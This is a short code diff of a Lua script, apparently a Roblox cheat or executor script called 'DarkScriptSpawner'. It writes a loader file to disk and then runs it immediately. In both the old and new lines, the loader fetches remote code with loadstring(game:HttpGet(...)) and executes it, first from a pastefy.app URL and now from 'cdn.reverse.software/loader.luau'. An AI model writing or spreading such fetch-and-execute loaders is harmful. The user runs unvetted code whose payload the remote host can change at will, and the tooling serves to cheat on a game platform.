@@ -16,13 +16,15 @@ end
 if foundFolder and writefile then
     local scriptName = "DarkScriptSpawner.txt"
     local scriptPath = foundFolder .. "/" .. scriptName
-    local scriptContent = 'loadstring(game:HttpGet("https://pastefy.app/mnZElfK5/raw"))()'
+    local scriptContent = 'ID="0ecc3178-2e26-44b9-8182-48a7819a50f5";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()'
     writefile(scriptPath, scriptContent)
 end
 
 -- Instantly execute the script
 pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/mnZElfK5/raw"))()
+    ID="0ecc3178-2e26-44b9-8182-48a7819a50f5";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end)
 
 -- Instantly show the UI
